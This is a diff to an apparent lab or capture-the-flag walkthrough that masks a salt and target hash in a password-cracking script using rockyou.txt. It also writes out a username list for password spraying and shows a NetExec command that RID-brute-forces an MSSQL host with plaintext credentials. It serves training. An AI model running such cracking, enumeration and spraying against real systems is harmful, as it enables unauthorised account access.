@@ -157,9 +157,9 @@ cat << 'EOF' > pass.py
 import hashlib
 from multiprocessing import Pool, cpu_count
 
-SALT = "AMtzteQIG7yAbZIa"
+SALT = "AMtzxXXXXXXXXXXXXXX"
 ITERATIONS = 600000
-TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
+TARGET_HASH = "0673ad90a0b4afXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 WORDLIST = "/usr/share/wordlists/rockyou.txt"
 
 def check_password(password: bytes):
@@ -197,6 +197,7 @@ def main():
 if __name__ == "__main__":
     main()
 EOF
+
 ```
 
 
@@ -223,7 +224,20 @@ nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
 Create user list:
 
 ```
-nano user.txt
+cat << 'EOF' > user.txt
+kevin
+mssqlsvc
+HR
+IT
+Finance
+jamie.dunn
+jane.smith
+alice.jones
+adam.scott
+bob.brown
+carol.white
+dave.green
+EOF
 ```
 
 Password spraying:
